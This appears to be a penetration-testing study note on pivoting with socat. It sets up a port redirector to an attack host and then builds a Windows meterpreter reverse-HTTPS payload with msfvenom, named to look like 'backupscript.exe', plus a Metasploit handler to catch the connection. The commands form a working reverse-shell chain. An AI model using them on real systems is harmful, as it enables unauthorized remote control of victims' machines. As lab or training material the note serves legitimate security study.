**Overview:**
[Socat](https://linux.die.net/man/1/socat) is a bidirectional relay tool that can create pipe sockets between `2` independent network channels without needing to use SSH tunneling. 
It acts as a redirector that can listen on one host and port and forward that data to another IP address and port. 

---
```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
starting socat listener

Socat will listen on localhost on port `8080` and forward all the traffic to port `80` on our attack host (10.10.14.18). Once our redirector is configured, we can create a payload that will connect back to our redirector, which is running on our Ubuntu server.

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
```
generate the payload and transfer it on the target host

```
msf6 > use exploit/multi/handler
```
run the payload, it should give back a connection from the ubutu server.

